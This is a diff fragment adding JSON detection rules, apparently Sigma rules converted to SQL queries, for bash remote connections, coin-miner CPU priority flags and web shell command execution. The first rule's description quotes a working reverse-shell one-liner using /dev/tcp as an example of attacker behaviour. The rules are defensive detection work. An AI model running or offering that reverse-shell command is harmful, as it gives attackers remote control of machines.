+        "description": "Detects a bash contecting to a remote IP address (often found when actors do something like 'bash -i >& /dev/tcp/10.0.0.1/4242 0>&1')",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.execution",
+            "attack.t1059.004"
+        ],
+        "falsepositives": [
+            "Unknown"
+        ],
+        "level": "critical",
+        "rule": [
+            "SELECT * FROM logs WHERE Image LIKE '%/bin/bash' ESCAPE '\\' AND (NOT (DestinationIp='127.0.0.1' OR DestinationIp='0.0.0.0'))"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Possible Coin Miner CPU Priority Param",
+        "id": "071d5e5a-9cef-47ec-bc4e-a42e34d8d0ed",
+        "status": "test",
+        "description": "Detects command line parameter very often used with coin miners",
+        "author": "Florian Roth (Nextron Systems)",
+        "tags": [
+            "attack.privilege-escalation",
+            "attack.t1068"
+        ],
+        "falsepositives": [
+            "Other tools that use a --cpu-priority flag"
+        ],
+        "level": "critical",
+        "rule": [
+            "SELECT * FROM logs WHERE a1 LIKE '--cpu-priority%' ESCAPE '\\' OR a2 LIKE '--cpu-priority%' ESCAPE '\\' OR a3 LIKE '--cpu-priority%' ESCAPE '\\' OR a4 LIKE '--cpu-priority%' ESCAPE '\\' OR a5 LIKE '--cpu-priority%' ESCAPE '\\' OR a6 LIKE '--cpu-priority%' ESCAPE '\\' OR a7 LIKE '--cpu-priority%' ESCAPE '\\'"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    },
+    {
+        "title": "Webshell Remote Command Execution",
+        "id": "c0d3734d-330f-4a03-aae2-65dacc6a8222",
+        "status": "test",
+        "description": "Detects possible command execution by web application/web shell",
+        "author": "Ilyas Ochkov, Beyu Denis, oscd.community",
+        "tags": [
+            "attack.persistence",
+            "attack.t1505.003"
+        ],
+        "falsepositives": [
+            "Admin activity",
+            "Crazy web applications"
+        ],
+        "level": "critical",
+        "rule": [
+            "SELECT * FROM logs WHERE type='SYSCALL' AND (SYSCALL='execve' OR SYSCALL='execveat') AND euid=33"
+        ],
+        "filename": "",
+        "channel": [],
+        "eventid": []
+    }
+]
